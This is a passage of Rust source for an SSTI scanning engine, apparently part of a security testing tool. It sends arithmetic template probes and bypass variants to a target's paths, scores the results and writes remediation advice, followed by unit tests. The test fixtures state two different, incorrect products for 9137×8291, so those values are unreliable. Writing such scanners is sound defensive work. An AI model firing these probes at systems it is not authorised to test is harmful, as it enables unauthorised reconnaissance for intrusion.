    if let Some(obj) = summary.as_object_mut() {
        obj.insert("category".to_string(), json!("posture_summary"));
        obj.insert("summary".to_string(), json!(true));
        obj.insert("posture_score".to_string(), json!(score));
        obj.insert("grade".to_string(), json!(grade));
        obj.insert(
            "remediation".to_string(),
            json!("Never pass user input into template render functions. Use logic-less templates, strict allow-list context objects, sandboxed engines (Jinja2 SandboxedEnvironment), and disable dangerous template builtins. Run SAST rules for template injection."),
        );
    }
    summary
}

// ── Public entry points ─────────────────────────────────────────────────────────

pub async fn run_ssti_result_ctx(target: &str, ctx: &EngineRunContext) -> EngineResult {
    let target = target.trim();
    if target.is_empty() {
        return EngineResult::error("target required");
    }

    let cfg = ScanConfig::load(&ArsenalConfig::from_ctx(ctx), ctx.memory_payloads.clone());
    let client = http_client().await;
    let base = normalize_url(target);
    let math = scan_math(&cfg.canary_prefix);

    let path_jobs: Vec<String> = cfg.paths.clone();
    let chunk_results: Vec<(Vec<Value>, SstiPosture)> = stream::iter(path_jobs)
        .map(|path| {
            let client = client.clone();
            let base = base.clone();
            let math = ScanMath {
                a: math.a,
                b: math.b,
                product: math.product.clone(),
                str_repeat: math.str_repeat.clone(),
                token: math.token.clone(),
            };
            let cfg = cfg.clone();
            let target = target.to_string();
            async move { probe_path(&client, &base, &path, &math, &cfg, &target).await }
        })
        .buffer_unordered(cfg.concurrency)
        .collect()
        .await;

    let mut all_findings: Vec<Value> = Vec::new();
    let mut aggregate = SstiPosture::default();

    for (mut chunk, posture) in chunk_results {
        all_findings.append(&mut chunk);
        aggregate.checks += posture.checks;
        aggregate.confirmed.extend(posture.confirmed);
        aggregate.error_based.extend(posture.error_based);
        aggregate.bypass_surfaces.extend(posture.bypass_surfaces);
        aggregate.template_engines.extend(posture.template_engines);
        aggregate.injection_vectors.extend(posture.injection_vectors);
        aggregate.frameworks.extend(posture.frameworks);
        if rank_sev(&posture.worst) > rank_sev(&aggregate.worst) {
            aggregate.worst = posture.worst;
        }
    }

    if cfg.attack_paths && aggregate.has_exposure() {
        all_findings.extend(synthesize_attack_paths(target, &aggregate));
    }

    let non_summary = all_findings
        .iter()
        .filter(|f| f.get("category").and_then(Value::as_str) != Some("posture_summary"))
        .count();

    if cfg.posture_score {
        all_findings.push(build_posture_summary(target, &aggregate, non_summary));
    }

    if all_findings.is_empty() {
        return empty_ok(ENGINE_ID, target);
    }

    let msg = format!(
        "SSTI posture on {} — {} finding(s), score {}/100 (token {}×{}={})",
        extract_host_label(&base),
        non_summary,
        aggregate.score(),
        math.a,
        math.b,
        math.product
    );
    EngineResult::ok(all_findings, msg)
}

fn rank_sev(s: &str) -> u8 {
    match s {
        "critical" => 4,
        "high" => 3,
        "medium" => 2,
        "low" => 1,
        _ => 0,
    }
}

fn extract_host_label(url: &str) -> String {
    url.trim_start_matches("https://")
        .trim_start_matches("http://")
        .split('/')
        .next()
        .unwrap_or(url)
        .to_string()
}

pub async fn run_ssti_result(target: &str) -> EngineResult {
    run_ssti_result_ctx(target, &EngineRunContext::default()).await
}

pub async fn run_ssti(target: &str) {
    print_result(run_ssti_result(target).await);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scan_math_produces_unique_product() {
        let m1 = scan_math("T");
        let m2 = scan_math("T");
        assert_ne!(m1.product, m2.product);
        assert!(m1.product.len() >= 6);
        assert!(m1.str_repeat.len() > m1.b as usize);
    }

    #[test]
    fn evaluation_requires_baseline_absence() {
        let baseline = HttpProbe {
            status: 200,
            headers: vec![],
            body: "hello".into(),
            final_url: "http://x".into(),
        };
        let probe = HttpProbe {
            status: 200,
            headers: vec![],
            body: "result 75708267 ok".into(),
            final_url: "http://x".into(),
        };
        assert!(evaluation_confirmed(
            &probe,
            "{{9137*8291}}",
            "75708267",
            &baseline
        ));
        let baseline2 = HttpProbe {
            status: 200,
            headers: vec![],
            body: "75708267 already here".into(),
            final_url: "http://x".into(),
        };
        assert!(!evaluation_confirmed(
            &probe,
            "{{9137*8291}}",
            "75708267",
            &baseline2
        ));
    }

    #[test]
    fn jinja_payloads_use_scan_math() {
        let m = ScanMath {
            a: 9137,
            b: 8291,
            product: "75728267".into(),
            str_repeat: "8291".repeat(9137),
            token: "T".into(),
        };
        let (p, e) = jinja_mul(&m);
        assert!(p.contains("9137"));
        assert!(p.contains("8291"));
        assert_eq!(e, "75728267");
    }

    #[test]
    fn error_detects_jinja() {
        let body = "Traceback: jinja2.exceptions.UndefinedError: 'x' is undefined";
        let hit = detect_error_based(body).unwrap();
        assert_eq!(hit.1, "Jinja2");
    }

    #[test]
    fn posture_score_degrades_on_confirm() {
        let mut p = SstiPosture::default();
        assert_eq!(p.score(), 100);
        p.confirmed.push("https://x/".into());
        assert!(p.score() < 80);
    }

    #[test]
    fn bypass_variants_include_spaced() {
        let v = bypass_variants("{{9137*8291}}");
        assert!(v.iter().any(|(n, _)| *n == "spaced-braces"));
        assert!(v.iter().any(|(n, _)| *n == "url-encoded"));
    }

    #[tokio::test]
    async fn empty_target_errors() {
        let r = run_ssti_result_ctx("", &EngineRunContext::default()).await;
        assert!(!r.success);
    }
}
